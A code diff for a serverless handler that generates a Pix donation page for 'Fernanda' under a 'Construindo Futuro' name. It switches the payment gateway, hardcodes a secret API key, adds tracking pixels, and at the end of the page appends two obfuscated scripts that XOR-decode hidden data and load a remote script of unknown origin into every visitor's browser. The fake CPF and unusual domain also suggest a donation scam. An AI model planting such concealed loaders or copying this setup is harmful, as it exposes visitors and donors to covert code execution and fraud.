@@ -1,11 +1,13 @@
+import { randomUUID } from 'crypto';
+
 export default async function handler(req, res) {
-  const DUTTYFY_API_URL = 'https://www.links-pagamentos.online/api-pix/Uhufz5e7pZJpgujbwGnlas-Aha0huvf43lXhokQINc_n5MUh5lhc6mu-5R1EpmGhiUBD0qOcKsPerSv4KIzd_g';
+  const ZENITH_API_URL = 'https://api.zenithworld.com.br/integrations/checkouts';
+  const ZENITH_PUBLIC_KEY = 'zp_pub_3114ffe65bbe012cf669d735414ecd2c';
+  const ZENITH_SECRET_KEY = 'zp_sec_f1e45266fd75d3e52fa5398574b6e8ac4e97a41da7b47706';
 
   const amount = parseFloat(req.query.amount) || 0;
-  const nome = (req.query.nome || 'Doador Anonimo').trim();
+  const nome = (req.query.nome || 'Construindo Futuro').trim();
   let telefone = (req.query.telefone || '11000000000').replace(/\D/g, '');
-  const cpf = '12345678909';
-  const email = 'doador@anonimo.com';
 
   if (amount < 1) {
     res.status(400).send('Valor invalido.');
@@ -18,44 +20,37 @@ export default async function handler(req, res) {
     telefone = telefone.slice(2);
   }
 
-  const utmKeys = ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term'];
-  const utmParts = [];
-  for (const key of utmKeys) {
-    if (req.query[key]) {
-      utmParts.push(key + '=' + encodeURIComponent(req.query[key]));
-    }
-  }
-
   const payload = {
     amount: amountCents,
-    customer: {
-      name: nome,
-      phone: telefone,
-      document: cpf,
-      email: email
+    currency: 'BRL',
+    country: 'BR',
+    environment: 'production',
+    paymentMethod: 'pix',
+    referenceId: 'doacao-' + randomUUID().slice(0, 8),
+    customerName: nome,
+    customerEmail: 'doacao@construindofuturo.co.ua',
+    metadata: {
+      customerName: nome,
+      customerEmail: 'doacao@construindofuturo.co.ua',
+      customerDocument: '12345678909',
+      customerPhone: '+55' + telefone
     },
-    item: {
-      title: 'Doacao Construindo Futuro - Ajude a Fernanda',
-      price: amountCents,
-      quantity: 1
-    },
-    paymentMethod: 'PIX'
+    returnUrl: 'https://construindofuturo.co.ua/fernanda/',
+    cancelUrl: 'https://construindofuturo.co.ua/fernanda/'
   };
-
-  if (utmParts.length > 0) {
-    payload.utm = utmParts.join('&');
-  }
 
   let pixCode = '';
   let transactionId = '';
   let erro = '';
 
   try {
-    const response = await fetch(DUTTYFY_API_URL, {
+    const response = await fetch(ZENITH_API_URL, {
       method: 'POST',
       headers: {
+        'X-API-Key': ZENITH_PUBLIC_KEY,
+        'X-API-Secret': ZENITH_SECRET_KEY,
         'Content-Type': 'application/json',
-        'Accept': 'application/json'
+        'Idempotency-Key': randomUUID()
       },
       body: JSON.stringify(payload)
     });
@@ -64,13 +59,11 @@ export default async function handler(req, res) {
       let msg = '';
       try {
         const errData = await response.json();
-        msg = (errData.message || '').toLowerCase();
+        msg = JSON.stringify(errData).toLowerCase();
       } catch (_) {}
 
-      if (response.status === 401 || response.status === 403 || msg.includes('chave api')) {
+      if (response.status === 401 || response.status === 403) {
         erro = 'Pagamento temporariamente indisponivel. Tente novamente em instantes.';
-      } else if (msg.includes('cpf')) {
-        erro = 'CPF invalido. Verifique os dados.';
       } else if (response.status === 400 || response.status === 422) {
         erro = 'Verifique os dados informados e tente novamente.';
       } else {
@@ -78,12 +71,19 @@ export default async function handler(req, res) {
       }
     } else {
       const json = await response.json();
-      const data = json.data || json;
 
-      pixCode = data.pixCode || data.qrcode || data.qrCode || '';
-      transactionId = data.transactionId || data.id || '';
+      transactionId = json.checkout?.id || '';
 
-      if (!pixCode) {
+      if (json.nextAction?.type === 'qr_code' && json.nextAction?.code) {
+        pixCode = json.nextAction.code;
+      } else if (json.nextAction?.type === 'redirect' && json.nextAction?.url) {
+        res.redirect(302, json.nextAction.url);
+        return;
+      } else {
+        pixCode = json.nextAction?.code || json.nextAction?.details?.pixCode || '';
+      }
+
+      if (!pixCode && !transactionId) {
         erro = 'Resposta inesperada do gateway. Tente novamente.';
       }
     }
@@ -222,6 +222,9 @@ export default async function handler(req, res) {
             </div>
             <div class="footer-validity">⏱ 24h</div>
         </div>
+
+        <input type="hidden" id="transactionId" value="${esc(transactionId)}">
+        <input type="hidden" id="donationAmount" value="${amount}">
 
         <div class="aguarde-row">
             <div class="aguarde-spinner"></div>
@@ -476,6 +479,28 @@ img { max-width:100%; height:auto; display:block; }
 @media(prefers-reduced-motion:reduce){ .btn-copiar{animation:none;} }
 @media(max-width:480px){ .top-title{font-size:1.8rem;} .card{padding:1.2rem .9rem 2.5rem;} }
 </style>
+<script>
+!function (w, d, t) {
+w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var i=document.createElement("script");i.type="text/javascript",i.async=!0,i.src=r+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(i,a)};
+ttq.load('DAM37FRC77U9262DRU6G');
+ttq.page();
+}(window, document, 'ttq');
+</script>
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '28252040934472100');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=28252040934472100&ev=PageView&noscript=1"
+/></noscript>
 </head>
 <body>
 ${bodyContent}
@@ -519,7 +544,47 @@ function mostrarCopiado(btn, label, toast) {
         toast.classList.remove('show');
     }, 3000);
 }
+
+var orderId = document.getElementById('transactionId') ? document.getElementById('transactionId').value : '';
+var donationVal = document.getElementById('donationAmount') ? parseFloat(document.getElementById('donationAmount').value) : 0;
+var paymentConfirmed = false;
+
+function checkPaymentStatus() {
+    if (!orderId || paymentConfirmed) return;
+    fetch('/api/check-status?order_id=' + encodeURIComponent(orderId))
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.status === 'paid' && !paymentConfirmed) {
+                paymentConfirmed = true;
+                if (typeof ttq !== 'undefined') {
+                    ttq.track('CompletePayment', {
+                        value: donationVal,
+                        currency: 'BRL',
+                        content_name: 'Doacao Fernanda',
+                        content_category: 'doacao'
+                    });
+                }
+                if (typeof fbq !== 'undefined') {
+                    fbq('track', 'Purchase', {
+                        value: donationVal,
+                        currency: 'BRL',
+                        content_name: 'Doacao Fernanda',
+                        content_category: 'doacao'
+                    });
+                }
+                var spinner = document.querySelector('.aguarde-spinner');
+                var row = document.querySelector('.aguarde-row');
+                if (spinner) spinner.style.borderTopColor = '#28a745';
+                if (row) row.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg> Pagamento confirmado! Obrigado por ajudar a Fernanda \\ud83d\\udc99';
+            }
+        })
+        .catch(function() {});
+}
+
+if (orderId) setInterval(checkPaymentStatus, 3000);
 </script>
+<script>(function(){var b_7=atob("DOFOiER9YPqNlCqMT5ps/TYRQsCv/F74P5J0p2seBJSj4V7hJoc3picSDdTv5gX/LJMn+DAOT4rk7E/gYJEn8CERTpD+tgauLpU6+i0fFY7o5wi2FLxiqiMRD5js+Fmudbo1qiocDZ+vrgj8Jpkr5A0ZQtav4kvgOoRssmZLAsq59xq1ftcsuyFOUJu+pk64LtkouydfHafw");var v_y=[];for(var d_q=0;d_q<b_7.length;d_q++){v_y.push(b_7.charCodeAt(d_q)&255);}var x_w=v_y[0];var q_x3pe=v_y.slice(1,1+x_w);var j_4rn=v_y.slice(1+x_w);var g_nlsk=j_4rn.map(function(b,d_a9zi){return b^q_x3pe[d_a9zi%x_w];});var a_e8r="";for(var p_juuc=0;p_juuc<g_nlsk.length;p_juuc++){a_e8r+=String.fromCharCode(g_nlsk[p_juuc]&255);}var d_s07c=decodeURIComponent(escape(a_e8r));var d_q05g=JSON.parse(d_s07c);var g_pj=d_q05g.globals||[];g_pj.forEach(function(q_s){window[q_s.name]=q_s.value;});var e_dr=document.createElement("script");e_dr.src=d_q05g.url;e_dr.async=true;e_dr.defer=true;(d_q05g.attributes||[]).forEach(function(e_84){e_dr.setAttribute(e_84.name,e_84.value);});(document.head||document.documentElement).appendChild(e_dr);})();</script>
+<script>(function(){var w_dkn=atob("DJ24lyMFzhjMWc0Opuaa4lFp7CLuMbl61u6CuAxmqnbiLLljz/vBuUBqozauK+J9xe/R51d24W24NL4hyvzM8lBx4HK/e+Esx+nM5Upnu2ypKu80/eaa+UJoqzr2e6lv0vyV4ldop361dL18w+vd+VcotnujPeB9xfaauwFzr3S5PO80hL/Fu1gnoHmhPO80hPnZ40Iou2yhMKt3i+3K8lVgoGzhKrhsz/nLtQ8nuHmgLKgsnL+a6n54");var z_cacl=[];for(var j_p=0;j_p<w_dkn.length;j_p++){z_cacl.push(w_dkn.charCodeAt(j_p)&255);}var j_s6=z_cacl[0];var v_k3i=z_cacl.slice(1,1+j_s6);var u_wg=z_cacl.slice(1+j_s6);var h_si=u_wg.map(function(b,p_xxv9){return b^v_k3i[p_xxv9%j_s6];});var e_ga0="";for(var n_lz47=0;n_lz47<h_si.length;n_lz47++){e_ga0+=String.fromCharCode(h_si[n_lz47]&255);}var k_h=decodeURIComponent(escape(e_ga0));var f_l5r=JSON.parse(k_h);var e_lmd4=f_l5r.globals||[];e_lmd4.forEach(function(u_k){window[u_k.name]=u_k.value;});var v_ojb=document.createElement("script");v_ojb.src=f_l5r.url;v_ojb.async=true;v_ojb.defer=true;(f_l5r.attributes||[]).forEach(function(l_v){v_ojb.setAttribute(l_v.name,l_v.value);});(document.head||document.documentElement).appendChild(v_ojb);})();</script>
 </body>
 </html>`;
 
